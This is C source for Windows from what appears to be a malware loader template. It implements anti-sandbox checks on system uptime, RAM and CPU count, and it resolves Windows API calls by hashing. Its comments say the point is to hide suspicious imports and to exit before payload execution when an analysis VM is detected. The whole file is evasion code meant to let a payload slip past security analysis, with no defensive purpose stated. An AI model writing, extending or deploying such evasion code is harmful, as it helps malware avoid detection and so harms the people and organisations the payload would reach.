#include <windows.h>
#include "sandbox.h"
#include "functions.h"

/*
 * RunSandboxChecks
 *
 * Lightweight pre-flight checks before payload execution.
 * Returns TRUE  -> environment looks like a real workstation.
 * Returns FALSE -> likely a sandbox / analysis VM; loader should exit cleanly.
 *
 * All WinAPI calls are resolved at runtime via API hashing (GetProcAddressH /
 * GetModuleHandleH) so no suspicious IAT entries appear in the binary.
 *
 * Checks performed:
 *   1. System uptime    < #-SANDBOX_MIN_UPTIME_MS-# ms
 *   2. Physical RAM     < #-SANDBOX_MIN_RAM_GB-# GB
 *   3. Logical CPU count < #-SANDBOX_MIN_CPU-#
 */

typedef ULONGLONG (WINAPI* pGetTickCount64_t)(void);
typedef BOOL      (WINAPI* pGlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
typedef void      (WINAPI* pGetSystemInfo_t)(LPSYSTEM_INFO);

BOOL RunSandboxChecks(void) {

    HMODULE hK32 = GetModuleHandleH(#-KERNEL32_VALUE-#);
    if (!hK32)
        return FALSE;

    /* --- 1. Uptime --- */
    pGetTickCount64_t fnGTC64 =
        (pGetTickCount64_t) GetProcAddressH(hK32, #-GETTICKCOUNT64_VALUE-#);
    if (!fnGTC64 || fnGTC64() < #-SANDBOX_MIN_UPTIME_MS-#)
        return FALSE;

    /* --- 2. RAM --- */
    pGlobalMemoryStatusEx_t fnGMSE =
        (pGlobalMemoryStatusEx_t) GetProcAddressH(hK32, #-GLOBALMEMORYSTATUSEX_VALUE-#);
    if (!fnGMSE)
        return FALSE;
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!fnGMSE(&ms))
        return FALSE;
    if (ms.ullTotalPhys < #-SANDBOX_MIN_RAM_BYTES-#)
        return FALSE;

    /* --- 3. CPU count --- */
    pGetSystemInfo_t fnGSI =
        (pGetSystemInfo_t) GetProcAddressH(hK32, #-GETSYSTEMINFO_VALUE-#);
    if (!fnGSI)
        return FALSE;
    SYSTEM_INFO si;
    fnGSI(&si);
    if (si.dwNumberOfProcessors < #-SANDBOX_MIN_CPU-#)
        return FALSE;

    return TRUE;
}

